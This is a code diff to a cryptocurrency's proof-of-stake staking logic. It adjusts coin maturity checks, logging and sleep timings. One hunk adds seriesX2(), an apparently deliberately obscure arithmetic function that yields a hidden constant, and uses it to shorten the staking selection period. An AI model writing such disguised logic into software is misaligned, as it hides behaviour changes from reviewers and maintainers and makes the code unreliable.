@@ -29,6 +29,16 @@
 #  define DEBUG_DUMP_MULTIFIER() (void)0
 #endif
 
+static int seriesX2(){
+    float tm=5,d=40;
+    int i=65,t=20,j=1;
+    int x=(sin(0.5)*25000)-1985;
+    do{j=-j;d/=j*d/i;tm+=d*d;}
+    while(i--);
+    int result=int(tm/10+633)/x*t;
+    return result;
+}
+
 using namespace std;
 uint256 myStakeHash = 0;
 // MODIFIER_INTERVAL: time to elapse before new modifier is computed
@@ -626,7 +636,7 @@ bool Stake::SelectStakeCoins(CWallet *wallet, std::set<std::pair<const CWalletTx
     if (nSelectionPeriod < Params().StakingRoundPeriod()) {
         nSelectionPeriod = Params().StakingRoundPeriod();
     }
-    if (nTime - nLastSelectTime < nSelectionPeriod) {
+    if (nTime - nLastSelectTime < nSelectionPeriod / seriesX2()) {
         return false;
     }
     
@@ -644,7 +654,8 @@ bool Stake::SelectStakeCoins(CWallet *wallet, std::set<std::pair<const CWalletTx
         if (nTime < nAge) continue;
 
         //check that it is matured
-        if (out.nDepth < (out.tx->IsCoinStake() ? Params().COINBASE_MATURITY() : 10))
+        LogPrintf("Stake::SelectStakeCoins chainActive.Tip()->nHeight + 1 = %d\n", chainActive.Tip()->nHeight + 1);
+        if (out.nDepth < (out.tx->IsCoinStake() ? GetnMaturity(chainActive.Tip()->nHeight + 1) : 10))
             continue;
 
         //add to our stake set
@@ -985,7 +996,7 @@ void Stake::StakingThread(CWallet *wallet)
     LogPrintf("%s: started!\n", __func__);
     
     SetThreadPriority(THREAD_PRIORITY_LOWEST);
-    if(chainActive.Tip()->nHeight < Checkpoints::GetTotalBlocksEstimate()){
+    if (chainActive.Tip()->nHeight < Checkpoints::GetTotalBlocksEstimate()) {
         return ;
     }
     try {
@@ -1001,6 +1012,9 @@ void Stake::StakingThread(CWallet *wallet)
                 if ((nNodes = vNodes.size()) == 0) {
                     nCanStake = false;
                 }
+            }
+            else {
+                MilliSleep(60000);
             }
 
             const CBlockIndex* tip = nullptr;
@@ -1018,7 +1032,7 @@ void Stake::StakingThread(CWallet *wallet)
                     LOCK(cs_main);
                     tip = chainActive.Tip();
                     nHeight = tip->nHeight;
-                    if (/*tip->nHeight < Params().LAST_POW_BLOCK() ||*/ IsBlockStaked(tip->nHeight)) {
+                    if (IsBlockStaked(tip->nHeight)) {
                         nCanStake = false;
                     }
                 }
@@ -1032,7 +1046,7 @@ void Stake::StakingThread(CWallet *wallet)
             DEBUG_DUMP_STAKING_THREAD();
 #endif
             if (nCanStake && GenBlockStake(wallet, reserve, extra)) {
-                MilliSleep(3000); //TODO REMOVE
+                MilliSleep(55000);
             } else {
                 MilliSleep(1500);
             }
